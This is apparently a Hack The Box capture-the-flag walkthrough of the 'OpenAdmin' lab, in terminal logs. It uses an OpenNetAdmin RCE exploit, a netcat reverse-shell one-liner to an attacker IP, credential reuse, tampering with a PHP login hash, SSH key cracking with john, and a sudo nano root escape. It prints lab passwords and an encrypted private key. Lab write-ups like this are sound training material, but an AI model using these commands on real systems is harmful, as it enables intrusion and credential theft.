RECON
root@kali:~/htb/openadmin# nmap -sC -sV -p- -vv -oA  full 10.10.10.171
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCcVHOWV8MC41kgTdwiBIBmUrM8vGHUM2Q7+a0LCl9jfH3bIpmuWnzwev97wpc8pRHPuKfKm0c3iHGII+cKSsVgzVtJfQdQ0j/GyDcBQ9s1VGHiYIjbpX30eM2P2N5g2hy9ZWsF36WMoo5Fr+mPNycf6Mf0QOODMVqbmE3VVZE1VlX3pNW4ZkMIpDSUR89JhH+PHz/miZ1OhBdSoNWYJIuWyn8DWLCGBQ7THxxYOfN1bwhfYRCRTv46tiayuF2NNKWaDqDq/DXZxSYjwpSVelFV+vybL6nU0f28PzpQsmvPab4PtMUb0epaj4ZFcB1VVITVCdBsiu4SpZDdElxkuQJz
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqbD5jGewKxd8heN452cfS5LS/VdUroTScThdV8IiZdTxgSaXN1Qga4audhlYIGSyDdTEL8x2tPAFPpvipRrLE=
|   256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBcV0sVI0yWfjKsl7++B9FGfOVeWAIWZ4YGEMROPxxk4
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

WEB ENUM
root@kali:~/htb/openadmin# gobuster -u http://10.10.10.171/ -x "cgi,com,htm,html,log,php,pl,txt,conf" -t 40 -s "200,204,301,302,307" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.171/
[+] Threads      : 40
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
[+] Extensions   : .cgi,.com,.htm,.html,.log,.php,.pl,.txt,.conf
=====================================================
/index.html (Status: 200)
/music (Status: 301)
/artwork (Status: 301)
/sierra (Status: 301)


BROWSE TO MUSIC DIRECTORY ON OPENADMIN
http://10.10.10.171/music

GOING TO THE LOGIN PAGE BRINGS YOU AS GUEST ON TH OPENNETADMIN PAGE
http://10.10.10.171/ona/

Opennetadmin version v18.1.1

WEAPONIZATION
https://www.exploit-db.com/exploits/47691
OR 
https://github.com/amriunix/ona-rce

RUN EXPLOIT SCRIPT
root@kali:~/htb/openadmin# git clone https://github.com/amriunix/ona-rce.git
root@kali:~/htb/openadmin/ona-rce# python3 ona-rce.py http://10.10.10.171/ona/
[*] OpenNetAdmin 18.1.1 - Remote Code Execution

[-] Usage: python3 ona-rce.py [check | exploit] <URL>

[*] Options:
	[+] check    : Verify if the target is vulnerable
	[+] exploit  : Exploiting the target

root@kali:~/htb/openadmin/ona-rce# python3 ona-rce.py check http://10.10.10.171/ona/
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] The remote host is vulnerable!
root@kali:~/htb/openadmin/ona-rce# python3 ona-rce.py exploit http://10.10.10.171/ona/
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] Connected Successfully!

GET SHELL AS USER WWW-DATA
sh$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh$ pwd
/opt/ona/www
sh$ ls -l /home
total 8
drwxr-x--- 5 jimmy  jimmy  4096 Nov 22  2019 jimmy
drwxr-x--- 6 joanna joanna 4096 Nov 28  2019 joanna

UPGRADE THE SHELL
sh$ mknod /tmp/backpipe p;/bin/sh -c "/bin/sh 0</tmp/backpipe | nc 10.10.14.26 1234 1>/tmp/backpipe"

root@kali:~/htb/openadmin# nc -lvp 1234
listening on [any] 1234 ...
10.10.10.171: inverse host lookup failed: Unknown host
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.171] 44198
id
whoami
www-data
python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@openadmin:/opt/ona/www$ stty raw -echo
stty raw -echo
www-data@openadmin:/opt/ona/www$ cd /tmp

TRANSFER OVER LINUX SMART ENUMERATION
root@kali:~/htb/openadmin# cp /root/linux-smart-enumeration/lse.sh .
root@kali:~/htb/openadmin# python -m SimpleHTTPServer 80

www-data@openadmin:/tmp$ wget 10.10.14.26/lse.sh
www-data@openadmin:/tmp$ chmod +x lse.sh

RUN LSE SCRIPT
www-data@openadmin:/tmp$ ./lse.sh             
---
If you know the current user password, write it here to check sudo privileges: 
---

 LSE Version: 3.0

        User: www-data
     User ID: 33
    Password: none
        Home: /var/www
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
       umask: 0022

    Hostname: openadmin
       Linux: 4.15.0-70-generic
Distribution: Ubuntu 18.04.3 LTS
Architecture: x86_64



www-data@openadmin:/tmp$ wget 10.10.14.26/linpeas.sh
2020-12-11 22:40:49 (338 KB/s) - 'linpeas.sh' saved [300165/300165]

www-data@openadmin:/tmp$ chmod +x linpeas.sh
www-data@openadmin:/tmp$ ./linpeas.sh

REVIEW DATABASE CONFIG FILE FROM LINPEAS OUTPUT
[+] Finding possible password variables inside key folders (limit 140)
/var/www/html/ona/local/config/database_settings.inc.php:        'db_database' => 'ona_default',
/var/www/html/ona/local/config/database_settings.inc.php:        'db_host' => 'localhost',

www-data@openadmin:/tmp$ cat /local/config/database_settings.inc.php
cat: /local/config/database_settings.inc.php: No such file or directory
www-data@openadmin:/tmp$ cat /var/www/html/ona/local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);


USE PASSWORD FROM DB FILE TO SSH AS USER JIMMY 

root@kali:~/htb/openadmin# ssh jimmy@10.10.10.171
The authenticity of host '10.10.10.171 (10.10.10.171)' can't be established.
ECDSA key fingerprint is SHA256:loIRDdkV6Zb9r8OMF3jSDMW3MnV5lHgn4wIRq+vmBJY.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.171' (ECDSA) to the list of known hosts. 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec 12 01:35:33 UTC 2020

  System load:  0.04              Processes:             156
  Usage of /:   58.0% of 7.81GB   Users logged in:       0
  Memory usage: 46%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
jimmy@openadmin:~$ hostname
openadmin
jimmy@openadmin:~$ pwd
/home/jimmy

RUN LSE SCRIPT AS JIMMY
immy@openadmin:/tmp$ wget 10.10.14.26/lse.sh
--2020-12-12 01:38:37--  http://10.10.14.26/lse.sh
Connecting to 10.10.14.26:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 40579 (40K) [text/x-sh]
Saving to: ‘lse.sh’

lse.sh                  100%[==============================>]  39.63K  --.-KB/s    in 0.05s   

2020-12-12 01:38:37 (732 KB/s) - ‘lse.sh’ saved [40579/40579]

jimmy@openadmin:/tmp$ chmod +x lse.sh 
jimmy@openadmin:/tmp$ ./lse.sh 
---
If you know the current user password, write it here to check sudo privileges: n1nj4W4rri0R!
---

 LSE Version: 3.0

        User: jimmy
     User ID: 1000
    Password: ******
        Home: /home/jimmy
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
       umask: 0002

    Hostname: openadmin
       Linux: 4.15.0-70-generic
Distribution: Ubuntu 18.04.3 LTS
Architecture: x86_64


REVIEW WITH LINPEAS SCRIPT AS USER JIMMY
jimmy@openadmin:/tmp$ wget 10.10.14.26/linpeas.sh

jimmy@openadmin:/tmp$ chmod +x linpeas.sh 
jimmy@openadmin:/tmp$ ./linpeas.sh 

[+] Finding 'username' string inside key folders (limit 70)
/tmp/linpeas.sh:    gitlab-rails runner 'User.where.not(username: "peasssssssss").each { |u| pp u.attributes }'
/tmp/lse.sh:    'grep $lse_grep_opts -Ei "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab'
/var/www/html/artwork/prepros-6.config:      "username": "",
/var/www/html/marga/prepros-6.config:      "username": "",
/var/www/html/sierra/js/jquery.form.js: * [ { name: 'username', value: 'jresig' }, { name: 'password', value: 'secret' } ]
/var/www/html/sierra/prepros-6.config:      "username": "",
/var/www/internal/index.php:                  $_SESSION['username'] = 'jimmy';
/var/www/internal/main.php:<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 

[+] Searching specific hashes inside files - less false positives (limit 70)

REVIEW THE /VAR/WWW/INTERNAL DIRECTORY
[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group jimmy:
/tmp/lse.sh
/tmp/l
/tmp/linpeas.sh
  Group internal:
/var/www/internal
/var/www/internal/main.php
/var/www/internal/logout.php
/var/www/internal/index.php

REVIEW FILES IN /VAR/WWW/INTERNAL DIRECTORY
jimmy@openadmin:/tmp$ cd /var/www/internal/
jimmy@openadmin:/var/www/internal$ ls -la
total 20
drwxrwx--- 2 jimmy internal 4096 Nov 23  2019 .
drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
jimmy@openadmin:/var/www/internal$ cat index.php 
<?php
   ob_start();
   session_start();
?>

<?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?>

<html lang = "en">

   <head>
      <title>Tutorialspoint.com</title>
      <link href = "css/bootstrap.min.css" rel = "stylesheet">

      <style>
         body {
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #ADABAB;
         }

         .form-signin {
            max-width: 330px;
            padding: 15px;
            margin: 0 auto;
            color: #017572;
         }

         .form-signin .form-signin-heading,
         .form-signin .checkbox {
            margin-bottom: 10px;
         }

         .form-signin .checkbox {
            font-weight: normal;
         }

         .form-signin .form-control {
            position: relative;
            height: auto;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            padding: 10px;
            font-size: 16px;
         }

         .form-signin .form-control:focus {
            z-index: 2;
         }

         .form-signin input[type="email"] {
            margin-bottom: -1px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
            border-color:#017572;
         }

         .form-signin input[type="password"] {
            margin-bottom: 10px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            border-color:#017572;
         }

         h2{
            text-align: center;
            color: #017572;
         }
      </style>

   </head>
   <body>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div> <!-- /container -->

      <div class = "container">

         <form class = "form-signin" role = "form"
            action = "<?php echo htmlspecialchars($_SERVER['PHP_SELF']);
            ?>" method = "post">
            <h4 class = "form-signin-heading"><?php echo $msg; ?></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>

      </div>

   </body>
</html>

jimmy@openadmin:/var/www/internal$ cat main.php 
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>

CAN READ USER JOANNA SSH KEY BY LOGGING INTO INDEX FILE IF SERVED SO SERVE THOSE FILES
jimmy@openadmin:/var/www/internal$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

DONWLOAD THOSE FILES
root@kali:~/htb/openadmin# wget http://10.10.10.171:8000/main.php
root@kali:~/htb/openadmin# wget http://10.10.10.171:8000/index.ph
root@kali:~/htb/openadmin# wget http://10.10.10.171:8000/logout.php

UPLOAD THE FILES AS USER WWW-DATA
www-data@openadmin:/tmp$ cd /opt/ona/www
www-data@openadmin:/opt/ona/www$ wget 10.10.14.26/index.php
www-data@openadmin:/opt/ona/www$ wget 10.10.14.26/main.php
www-data@openadmin:/opt/ona/www$ wget 10.10.14.26/logout.php

BROWSE TO INDEX LOGIN PAGE AND LOGIN AS USER JIMMY
http://10.10.10.171/ona/index.php.1
username:jimmy
password:n1nj4W4rri0R!

RESPONSE
http://10.10.10.171/ona/%3C?php%20echo%20htmlspecialchars($_SERVER[%27PHP_SELF%27]);%20%20%20%20%20%20%20%20%20%20%20%20?%3E

LOGIN REDIRECT FAILED SO LOOK AT NETSTAT FOR ALTERNATIVE PORT
jimmy@openadmin:/var/www$ netstat -alno
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)

SSH PORT FORWARD 52846 TO KALI
KeyboardInterrupt
root@kali:~/htb/openadmin# ssh -L :52846:localhost:52846 jimmy@openadmin.htb
The authenticity of host 'openadmin.htb (10.10.10.171)' can't be established.
ECDSA key fingerprint is SHA256:loIRDdkV6Zb9r8OMF3jSDMW3MnV5lHgn4wIRq+vmBJY.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'openadmin.htb' (ECDSA) to the list of known hosts.
jimmy@openadmin.htb's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
jimmy@openadmin:~$ 

BROWSE TO INDEX LOGIN PAGE ON LOCALHOST AND LOGIN AS USER JIMMY
http://10.10.14.26:52846
username:jimmy
password:n1nj4W4rri0R!

LOGIN FAILS HOWEVER CURL TO THAT MAIN PHP FILE RETRIEVES JOANNA SSH KEY DUE TO IMPROPER PHP VALIDATION
jimmy@openadmin:/var/www/internal$ curl http://localhost:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>

OR CREATE NEW SHA512 PASSSOWRD HASH FOR USER JIMMY AND ADD TO INDEX PHP FILE TO LOGIN
root@kali:~/htb/openadmin#  echo -n openadmin20 | sha512sum
5dd9a6dcbe5d357478eaed6a9e799298bfbef0f320d79fbf9c700b3772c3281d4c684e2e35ea59e8f9a338a30e03090bb315512e166a0a8141be1a3e51ddc1ba  -

jimmy@openadmin:/var/www/internal$ vim index.php 
jimmy@openadmin:/var/www/internal$ cat index.php | grep "sha512"
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '5dd9a6dcbe5d357478eaed6a9e799298bfbef0f320d79fbf9c700b3772c3281d4c684e2e35ea59e8f9a338a30e03090bb315512e166a0a8141be1a3e51ddc1ba') {

RELOAD THE INDEX PAGE AND LOGIN TO GET THE SSH RSA KEY FOR USER JOANNA
curl http://localhost:52846/index.php

http://localhost:52846/main.php
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----

Don't forget your "ninja" password
Click here to logout Session 

CONVERT SSH RSA KEY TO HASH FOR CRACKING WITH JON
root@kali:~/htb/openadmin#
root@kali:~/htb/openadmin# python /usr/share/john/ssh2john.py joanna_ssh > joanna_ssh.hash
root@kali:~/htb/openadmin# john --wordlist=/usr/share/wordlists/rockyou.txt joanna_ssh.hash
bloodninjas      (julia-ssh)

CREATE RSA FILE FOR USER JOANNA
root@kali:~/htb/openadmin# vim joanna_id_rsa
root@kali:~/htb/openadmin# chmod 600 joanna_id_rsa 

LOGIN AS USER JOANNA
root@kali:~/htb/openadmin# ssh -i joanna_id_rsa joanna@10.10.10.171
Enter passphrase for key 'joanna_id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec 12 02:56:29 UTC 2020

  System load:  0.0               Processes:             136
  Usage of /:   62.4% of 7.81GB   Users logged in:       1
  Memory usage: 38%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
joanna@openadmin:~$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
joanna@openadmin:~$ hostname
openadmin

GET USER FLAG
joanna@openadmin:~$ cat user.txt
##########################################

PRIVESC

CHECK SUDO PRIVILEGES
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv

REVIEW GTFOBINS FOR NANO SUDO 
https://gtfobins.github.io/gtfobins/nano/#sudo
sudo nano
^R^X
reset; sh 1>&0 2>&0


GET ROOT SHELL
joanna@openadmin:~$ sudo nano /opt/priv
^R^X
reset; sh 1>&0 2>&0

# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
openadmin

GET ROOT FLAG
# cat /root/root.txt
#########################################################
